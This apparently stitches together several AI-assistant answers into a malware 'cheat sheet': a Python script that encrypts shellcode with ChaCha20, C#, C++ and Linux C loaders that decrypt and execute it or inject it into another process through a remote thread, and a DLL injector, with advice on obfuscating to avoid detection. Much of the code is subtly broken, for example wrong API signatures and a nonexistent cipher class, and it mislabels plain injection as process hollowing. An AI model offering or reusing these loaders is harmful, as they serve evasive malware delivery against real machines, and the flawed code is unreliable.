
Here’s a detailed guide on using ChaCha20 encryption for process hollowing examples in C# and C++, including Python code for encryption, and C code for decryption on Linux. 

### **ChaCha20 Cheat Sheet**

#### **1. Python Code for Encryption**

This Python script encrypts shellcode using ChaCha20 and saves the encrypted output and encryption key. You need `PyCryptodome` for this.

**Install `PyCryptodome`:**
```bash
pip install pycryptodome
```

**Python Script (`encrypt_shellcode.py`):**
```python
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes
import sys

def encrypt_shellcode(shellcode_path, output_path):
    # Generate a random key and nonce
    key = get_random_bytes(32)  # ChaCha20 uses 256-bit key
    nonce = get_random_bytes(8)  # ChaCha20 uses 64-bit nonce

    # Read the shellcode from the file
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    # Create a ChaCha20 cipher object
    cipher = ChaCha20.new(key=key, nonce=nonce)

    # Encrypt the shellcode
    ciphertext = cipher.encrypt(shellcode)

    # Write the encrypted shellcode and key to output file
    with open(output_path, 'wb') as f:
        f.write(nonce + key + ciphertext)  # Prepend nonce and key for decryption

    print("Encryption complete.")
    print(f"Nonce (8 bytes): {nonce.hex()}")
    print(f"Key (32 bytes): {key.hex()}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python encrypt_shellcode.py <shellcode_file> <output_file>")
        sys.exit(1)
    encrypt_shellcode(sys.argv[1], sys.argv[2])
```

#### **2. C# Code for Decryption and Process Hollowing**

**Note:** This example uses `CsWin32` for Windows API calls. Make sure to include the `CsWin32` package in your project.

**C# Code (`DecryptShellcode.cs`):**
```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
using CsWin32;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: DecryptShellcode <target_process_id> <encrypted_shellcode_file>");
            return;
        }

        int targetProcessId = int.Parse(args[0]);
        string encryptedShellcodePath = args[1];

        // Read the encrypted shellcode
        byte[] encryptedData = File.ReadAllBytes(encryptedShellcodePath);
        byte[] nonce = new byte[8];
        byte[] key = new byte[32];
        byte[] ciphertext = new byte[encryptedData.Length - 40];

        Array.Copy(encryptedData, 0, nonce, 0, 8);
        Array.Copy(encryptedData, 8, key, 0, 32);
        Array.Copy(encryptedData, 40, ciphertext, 0, ciphertext.Length);

        // Decrypt the shellcode
        using (var chacha = new ChaCha20Managed())
        {
            chacha.Key = key;
            chacha.Nonce = nonce;
            byte[] decryptedShellcode = chacha.Decrypt(ciphertext);

            // Write decrypted shellcode to memory of target process
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
            IntPtr remoteAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            WriteProcessMemory(hProcess, remoteAddress, decryptedShellcode, (uint)decryptedShellcode.Length, out _);
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, out _);
        }
    }
}
```

#### **3. C Code for Decryption on Linux**

**C Code (`decrypt_shellcode.c`):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "chacha20.h" // You'll need a ChaCha20 implementation for C

#define NONCE_SIZE 8
#define KEY_SIZE 32

void decrypt_and_execute(const char *filename) {
    int fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    // Read nonce and key
    uint8_t nonce[NONCE_SIZE];
    uint8_t key[KEY_SIZE];
    if (read(fd, nonce, NONCE_SIZE) != NONCE_SIZE || read(fd, key, KEY_SIZE) != KEY_SIZE) {
        perror("read");
        exit(EXIT_FAILURE);
    }

    // Read encrypted shellcode
    off_t file_size = lseek(fd, 0, SEEK_END);
    lseek(fd, NONCE_SIZE + KEY_SIZE, SEEK_SET);
    size_t encrypted_size = file_size - (NONCE_SIZE + KEY_SIZE);
    uint8_t *encrypted_data = malloc(encrypted_size);
    if (read(fd, encrypted_data, encrypted_size) != encrypted_size) {
        perror("read");
        exit(EXIT_FAILURE);
    }
    close(fd);

    // Decrypt shellcode
    uint8_t *decrypted_data = malloc(encrypted_size);
    chacha20_decrypt(key, nonce, encrypted_data, decrypted_data, encrypted_size);

    // Execute shellcode
    void (*func)();
    func = (void (*)()) decrypted_data;
    func();

    free(encrypted_data);
    free(decrypted_data);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <encrypted_shellcode_file>\n", argv[0]);
        return EXIT_FAILURE;
    }
    decrypt_and_execute(argv[1]);
    return EXIT_SUCCESS;
}
```

**Note:**
- **Obfuscation**: Implementing obfuscation in the C/C++ code involves techniques like code obfuscation, dynamic code generation, or encrypted function pointers, but is beyond the scope of this basic example. For practical purposes, obfuscating shellcode and encryption keys should be done carefully to avoid detection and analysis.

- **ChaCha20 Implementation**: You'll need a ChaCha20 implementation in C for the decryption step. You can find open-source implementations or libraries like `libchacha` that you can include in your project.

- **Static Compilation**: Ensure all the code is statically compiled by linking the required libraries statically. This may require adjusting your build configuration accordingly.

By following these steps, you can encrypt shellcode using ChaCha20 in Python, decrypt and execute it on Windows using C#, and on Linux using C. Make sure to include the appropriate ChaCha20 libraries and handle all security aspects carefully.

To demonstrate process hollowing and injection using ChaCha20 encryption, I'll provide examples in both C# and C++ that utilize the `CsWin32` library for Windows API calls. These examples will cover the following:

1. **Encrypt Shellcode in Python**
2. **Decrypt and Inject Shellcode Using C# with `CsWin32`**
3. **Decrypt and Inject Shellcode Using C++**

### **1. Python Code for Encryption**

This code encrypts shellcode using ChaCha20 and outputs a file containing the encrypted shellcode along with the nonce and key.

```python
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes
import sys

def encrypt_shellcode(shellcode_path, output_path):
    # Generate a random key and nonce
    key = get_random_bytes(32)  # ChaCha20 uses 256-bit key
    nonce = get_random_bytes(8)  # ChaCha20 uses 64-bit nonce

    # Read the shellcode from the file
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    # Create a ChaCha20 cipher object
    cipher = ChaCha20.new(key=key, nonce=nonce)

    # Encrypt the shellcode
    ciphertext = cipher.encrypt(shellcode)

    # Write the encrypted shellcode and key to output file
    with open(output_path, 'wb') as f:
        f.write(nonce + key + ciphertext)  # Prepend nonce and key for decryption

    print("Encryption complete.")
    print(f"Nonce (8 bytes): {nonce.hex()}")
    print(f"Key (32 bytes): {key.hex()}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python encrypt_shellcode.py <shellcode_file> <output_file>")
        sys.exit(1)
    encrypt_shellcode(sys.argv[1], sys.argv[2])
```

### **2. C# Code for Decrypting and Injecting Shellcode with `CsWin32`**

This C# code uses the `CsWin32` library for Windows API calls to inject shellcode into a process.

**Install `CsWin32`:**
```shell
dotnet add package CsWin32
```

**C# Code (`InjectShellcode.cs`):**

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
using CsWin32;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: InjectShellcode <target_process_id> <encrypted_shellcode_file>");
            return;
        }

        int targetProcessId = int.Parse(args[0]);
        string encryptedShellcodePath = args[1];

        // Read the encrypted shellcode
        byte[] encryptedData = File.ReadAllBytes(encryptedShellcodePath);
        byte[] nonce = new byte[8];
        byte[] key = new byte[32];
        byte[] ciphertext = new byte[encryptedData.Length - 40];

        Array.Copy(encryptedData, 0, nonce, 0, 8);
        Array.Copy(encryptedData, 8, key, 0, 32);
        Array.Copy(encryptedData, 40, ciphertext, 0, ciphertext.Length);

        // Decrypt the shellcode
        using (var chacha = new ChaCha20Managed())
        {
            chacha.Key = key;
            chacha.Nonce = nonce;
            byte[] decryptedShellcode = chacha.Decrypt(ciphertext);

            // Write decrypted shellcode to memory of target process
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
            IntPtr remoteAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            WriteProcessMemory(hProcess, remoteAddress, decryptedShellcode, (uint)decryptedShellcode.Length, out _);
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, out _);
        }
    }
}
```

### **3. C++ Code for Decrypting and Injecting Shellcode**

This C++ code uses Windows API functions to inject decrypted shellcode into a target process.

**C++ Code (`inject_shellcode.cpp`):**

```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <wincrypt.h>

// ChaCha20 decryption function (simplified, use a complete implementation in practice)
void ChaCha20Decrypt(const unsigned char* key, const unsigned char* nonce, const unsigned char* ciphertext, unsigned char* plaintext, size_t length);

void InjectShellcode(DWORD processId, const std::string& encryptedShellcodeFile) {
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "Failed to open process" << std::endl;
        return;
    }

    // Read the encrypted shellcode
    std::ifstream file(encryptedShellcodeFile, std::ios::binary);
    std::vector<unsigned char> encryptedData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Extract nonce, key, and ciphertext
    unsigned char nonce[8];
    unsigned char key[32];
    std::copy(encryptedData.begin(), encryptedData.begin() + 8, nonce);
    std::copy(encryptedData.begin() + 8, encryptedData.begin() + 40, key);
    std::vector<unsigned char> ciphertext(encryptedData.begin() + 40, encryptedData.end());

    // Decrypt the shellcode
    std::vector<unsigned char> decryptedShellcode(ciphertext.size());
    ChaCha20Decrypt(key, nonce, ciphertext.data(), decryptedShellcode.data(), ciphertext.size());

    // Allocate memory in the target process
    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, decryptedShellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddress) {
        std::cerr << "Failed to allocate memory" << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Write the decrypted shellcode to the target process
    SIZE_T bytesWritten;
    WriteProcessMemory(hProcess, remoteAddress, decryptedShellcode.data(), decryptedShellcode.size(), &bytesWritten);
    if (bytesWritten != decryptedShellcode.size()) {
        std::cerr << "Failed to write memory" << std::endl;
        VirtualFreeEx(hProcess, remoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread" << std::endl;
        VirtualFreeEx(hProcess, remoteAddress, 0, MEM_RELEASE);
    } else {
        CloseHandle(hThread);
    }

    // Clean up
    CloseHandle(hProcess);
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: inject_shellcode <target_process_id> <encrypted_shellcode_file>" << std::endl;
        return 1;
    }

    DWORD processId = std::stoi(argv[1]);
    std::string encryptedShellcodeFile = argv[2];

    InjectShellcode(processId, encryptedShellcodeFile);

    return 0;
}
```

### **Summary**

1. **Python Encryption Script**: Encrypts shellcode using ChaCha20 and saves the encrypted data, nonce, and key.
2. **C# Decryption and Injection**: Uses `CsWin32` to handle Windows API calls for process hollowing and shellcode injection.
3. **C++ Decryption and Injection**: Demonstrates similar functionality with direct Windows API calls for decryption and injection.

Ensure that your ChaCha20 decryption implementations in both C# and C++ are complete and correct. These examples are simplified and for demonstration purposes. In real-world scenarios, consider using well-tested libraries and thoroughly testing the implementations.

Certainly! If you're using `Windows.Win32` with PInvoke function calls, you'll work with the `Windows.Win32` namespace to access the necessary Windows API functions for process hollowing and DLL injection.

Here’s how you can use `Windows.Win32` for these tasks in C#:

### **1. Setup and Dependencies**

Ensure you have the `Windows.Win32` package installed. Add it to your project with:

```bash
dotnet add package Windows.Win32
```

### **2. C# Code for Process Hollowing Using `Windows.Win32`**

The following code demonstrates process hollowing and injection using `Windows.Win32` libraries with PInvoke.

**`InjectShellcode.cs`**

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.Kernel;
using Windows.Win32.System.Memory;
using Windows.Win32.System.Threads;

class Program
{
    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: InjectShellcode <target_process_id> <encrypted_shellcode_file>");
            return;
        }

        int targetProcessId = int.Parse(args[0]);
        string encryptedShellcodePath = args[1];

        // Read the encrypted shellcode
        byte[] encryptedData = File.ReadAllBytes(encryptedShellcodePath);
        byte[] nonce = new byte[8];
        byte[] key = new byte[32];
        byte[] ciphertext = new byte[encryptedData.Length - 40];

        Array.Copy(encryptedData, 0, nonce, 0, 8);
        Array.Copy(encryptedData, 8, key, 0, 32);
        Array.Copy(encryptedData, 40, ciphertext, 0, ciphertext.Length);

        // Decrypt the shellcode
        byte[] decryptedShellcode;
        using (var chacha = new ChaCha20Managed())
        {
            chacha.Key = key;
            chacha.Nonce = nonce;
            decryptedShellcode = chacha.Decrypt(ciphertext);
        }

        // Use Windows.Win32 APIs to handle process hollowing
        var hProcess = PInvoke.OpenProcess(PROCESS_ALL_ACCESS, false, (uint)targetProcessId);
        if (hProcess.IsNull)
        {
            Console.WriteLine("Failed to open process.");
            return;
        }

        // Allocate memory in the target process
        var remoteAddress = PInvoke.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
        if (remoteAddress.IsNull)
        {
            Console.WriteLine("Failed to allocate memory.");
            PInvoke.CloseHandle(hProcess);
            return;
        }

        // Write the decrypted shellcode to the target process
        if (!PInvoke.WriteProcessMemory(hProcess, remoteAddress, decryptedShellcode, (uint)decryptedShellcode.Length, out _))
        {
            Console.WriteLine("Failed to write memory.");
            PInvoke.VirtualFreeEx(hProcess, remoteAddress, 0, FreeType.Release);
            PInvoke.CloseHandle(hProcess);
            return;
        }

        // Create a remote thread to execute the shellcode
        if (PInvoke.CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, out _) == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create remote thread.");
            PInvoke.VirtualFreeEx(hProcess, remoteAddress, 0, FreeType.Release);
            PInvoke.CloseHandle(hProcess);
            return;
        }

        Console.WriteLine("Shellcode injected and executed successfully.");

        // Clean up
        PInvoke.CloseHandle(hProcess);
    }
}

// ChaCha20 encryption class (simplified, use a complete implementation in practice)
public class ChaCha20Managed : IDisposable
{
    private readonly ChaCha20 _chacha;

    public byte[] Key { get; set; }
    public byte[] Nonce { get; set; }

    public ChaCha20Managed()
    {
        _chacha = new ChaCha20();
    }

    public byte[] Decrypt(byte[] ciphertext)
    {
        return _chacha.Decrypt(Key, Nonce, ciphertext);
    }

    public void Dispose()
    {
        _chacha.Dispose();
    }
}

// Define enums and flags for process access, memory allocation, and protection
[Flags]
public enum AllocationType : uint
{
    Commit = 0x1000
}

[Flags]
public enum MemoryProtection : uint
{
    ExecuteReadWrite = 0x40
}

[Flags]
public enum FreeType : uint
{
    Release = 0x8000
}
```

### **3. C# Code for DLL Injection Using `Windows.Win32`**

**`InjectDll.cs`**

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.Kernel;
using Windows.Win32.System.Memory;
using Windows.Win32.System.Threads;

class Program
{
    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: InjectDll <target_process_id> <dll_path>");
            return;
        }

        int targetProcessId = int.Parse(args[0]);
        string dllPath = args[1];

        // Open the target process
        var hProcess = PInvoke.OpenProcess(PROCESS_ALL_ACCESS, false, (uint)targetProcessId);
        if (hProcess.IsNull)
        {
            Console.WriteLine("Failed to open process.");
            return;
        }

        // Allocate memory for the DLL path in the target process
        var dllPathLength = (uint)(dllPath.Length + 1) * sizeof(char);
        var remoteAddress = PInvoke.VirtualAllocEx(hProcess, IntPtr.Zero, dllPathLength, AllocationType.Commit, MemoryProtection.ReadWrite);
        if (remoteAddress.IsNull)
        {
            Console.WriteLine("Failed to allocate memory.");
            PInvoke.CloseHandle(hProcess);
            return;
        }

        // Write the DLL path to the target process memory
        if (!PInvoke.WriteProcessMemory(hProcess, remoteAddress, dllPath, dllPathLength, out _))
        {
            Console.WriteLine("Failed to write memory.");
            PInvoke.VirtualFreeEx(hProcess, remoteAddress, 0, FreeType.Release);
            PInvoke.CloseHandle(hProcess);
            return;
        }

        // Get the address of LoadLibraryA in kernel32.dll
        var hKernel32 = PInvoke.GetModuleHandle("kernel32.dll");
        var loadLibraryAddr = PInvoke.GetProcAddress(hKernel32, "LoadLibraryW");

        // Create a remote thread in the target process to load the DLL
        if (PInvoke.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, remoteAddress, 0, out _) == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create remote thread.");
            PInvoke.VirtualFreeEx(hProcess, remoteAddress, 0, FreeType.Release);
            PInvoke.CloseHandle(hProcess);
            return;
        }

        Console.WriteLine("DLL injected successfully.");

        // Clean up
        PInvoke.CloseHandle(hProcess);
    }
}
```

### **Explanation:**

1. **Process Hollowing:** This example shows how to read, decrypt, and inject shellcode into a target process using `CsWin32`. It uses the `PInvoke` class to call necessary functions.

2. **DLL Injection:** This example demonstrates how to inject a DLL into a target process. It allocates memory, writes the DLL path, and creates a remote thread to execute `LoadLibraryW`.

3. **ChaCha20 Decryption:** For simplicity, ChaCha20 is handled as a placeholder class. You should use a full ChaCha20 implementation for encryption/decryption.

These examples use `Windows.Win32` to handle process manipulation without directly invoking DLLs. Ensure the decryption and memory manipulation logic is tested and secure for production use.